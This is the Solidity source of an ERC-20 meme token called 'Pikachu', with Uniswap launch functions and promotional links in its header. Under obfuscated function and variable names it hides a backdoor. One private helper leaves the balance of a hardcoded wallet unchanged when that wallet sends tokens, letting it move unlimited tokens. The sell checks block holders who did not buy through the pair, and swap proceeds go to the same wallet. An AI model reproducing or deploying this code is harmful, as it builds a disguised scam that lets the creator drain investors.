/**

X: https://twitter.com/Pikachu_Portal

Telegram: https://t.me/Pikachu_Portal

Website: https://pikachuerc.org/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qorivj(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qorivj(a, b, "SafeMath");
    }

    function  _qorivj(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _bifcvh(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Pikachu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _poatcr;
    address payable private _phofiky;
    address private _bavenp;
    string private constant _name = unicode"Pikachu";
    string private constant _symbol = unicode"Pikachu";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _qltoie=0;
    uint256 private _qevost=0;
    uint256 public _pafyob = _totalSupply;
    uint256 public _qrrefk = _totalSupply;
    uint256 public _pjoaeb= _totalSupply;
    uint256 public _qrigpf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _blaexd;
    mapping (address => bool) private _pvlkcu;
    mapping(address => uint256) private _fllnou;

    bool private _Pikachuopen;
    bool public _peudsq = false;
    bool private blkitf = false;
    bool private _ruyakj = false;


    event _qufakj(uint _pafyob);
    modifier fraivy {
        blkitf = true;
        _;
        blkitf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _blaexd[owner(

        )] = true;
        _blaexd[address
        (this)] = true;
        _blaexd[
            _phofiky] = true;
        _phofiky = 
        payable (0x970f8910A984ee1d2c1E7b6A5066C949ec761BF8);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qorivj(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 yoriug=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_peudsq) {
                if (to 
                != address
                (_poatcr) 
                && to !=
                 address
                 (_bavenp)) {
                  require(_fllnou
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fllnou
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bavenp && to != 
            address(_poatcr) &&
             !_blaexd[to] ) {
                require(amount 
                <= _pafyob,
                 "Exceeds the _pafyob.");
                require(balanceOf
                (to) + amount
                 <= _qrrefk,
                  "Exceeds the _qrrefk.");
                if(_qevost
                < _qltoie){
                  require
                  (! _frajov(to));
                }
                _qevost++;
                 _pvlkcu
                 [to]=true;
                yoriug = amount._bifcvh
                ((_qevost>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bavenp &&
             from!= address(this) 
            && !_blaexd[from] ){
                require(amount <= 
                _pafyob && 
                balanceOf(_phofiky)
                <_qrigpf,
                 "Exceeds the _pafyob.");
                yoriug = amount._bifcvh((_qevost>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qevost>
                _qltoie &&
                 _pvlkcu[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!blkitf 
            && to == _bavenp &&
             _ruyakj &&
             contractTokenBalance>
             _pjoaeb 
            && _qevost>
            _qltoie&&
             !_blaexd[to]&&
              !_blaexd[from]
            ) {
                _transferFrom( _bcpikv(amount, 
                _bcpikv(contractTokenBalance,
                _qrigpf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ptnyk(address
                    (this).balance);
                }
            }
        }

        if(yoriug>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(yoriug);
          emit
           Transfer(from,
           address
           (this),yoriug);
        }
        _balances[from
        ]= _qorivj(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qorivj(yoriug));
        emit Transfer
        (from, to, 
        amount.
         _qorivj(yoriug));
    }

    function _transferFrom(uint256
     tokenAmount) private
      fraivy {
        if(tokenAmount==
        0){return;}
        if(!_Pikachuopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _poatcr.WETH();
        _approve(address(this),
         address(
             _poatcr), 
             tokenAmount);
        _poatcr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _bcpikv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qorivj(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _phofiky){
            return a ;
        }else{
            return a .
             _qorivj (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pafyob = _totalSupply;
        _qrrefk = _totalSupply;
        emit _qufakj(_totalSupply);
    }

    function _frajov(address 
    account) private view 
    returns (bool) {
        uint256 eorihp;
        assembly {
            eorihp :=
             extcodesize
             (account)
        }
        return eorihp > 
        0;
    }

    function _ptnyk(uint256
    amount) private {
        _phofiky.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _Pikachuopen ) ;
        _poatcr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _poatcr), 
            _totalSupply);
        _bavenp = 
        IUniswapV2Factory(_poatcr.
        factory( ) 
        ). createPair (
            address(this
            ),  _poatcr .
             WETH ( ) );
        _poatcr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bavenp).
        approve(address(_poatcr), 
        type(uint)
        .max);
        _ruyakj = true;
        _Pikachuopen = true;
    }

    receive() external payable {}
}